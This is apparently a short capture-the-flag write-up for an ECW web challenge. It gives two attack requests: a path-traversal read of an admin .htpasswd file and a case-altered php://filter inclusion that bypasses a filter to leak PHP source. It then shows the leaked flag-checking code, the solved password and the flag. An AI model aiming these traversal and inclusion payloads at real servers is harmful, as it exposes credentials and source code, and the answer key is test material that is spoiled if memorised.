// I first get https://challenge-ecw.fr/chals/web400/index.php?file=../admin/.htpasswd
// then I get https://challenge-ecw.fr/chals/web400/admin/index.php?file=php://filteR/convert.base64-encode/resource=checkFlag.php (notice the filteR to bypass simple filter
// then I reverse the PHP code and get the flag

<?php
require_once("header.php");
echo '<div id="corp"><center>';
if(isset($_POST['flag']))
{
    $f=trim($_POST['flag']);
    if(strlen($f) === 11 &&
    $f[0] === 'U' &&
    $f[10] === 'R' &&
    ord($f[1]) - 5 === 77 &&
    ord($f[6]) ^ 21 === 84 &&
    $f[2] === $f[4] &&
    $f[2] === '_' &&
    $f[7] === $f[8] &&
    ord($f[3]) ^ ord($f[6]) === 0 &&
    $f[5] === 'H' &&
    ord($f[8]) ^ ord($f[6]) === 25 &&
    ord($f[9]) + 7 === 55)
        {
            echo '<h1>Bravo!</h1><br />
                                   <h2>Valide l\'épreuve avec le hash md5 du mot de passe !<br /> Format ECW{md5}</h2>';
        }
    else
        {
            echo '<h1>Accès refusé</h1>';
        }
}
else
        echo "<p>&nbsp;</p>";
echo '</center></div>';
require_once("../footer.php");
?>

// UR_A_HAXX0R
// flag is: ECW{73b034682bdfca629bf9f3d3bf0f5ec9}
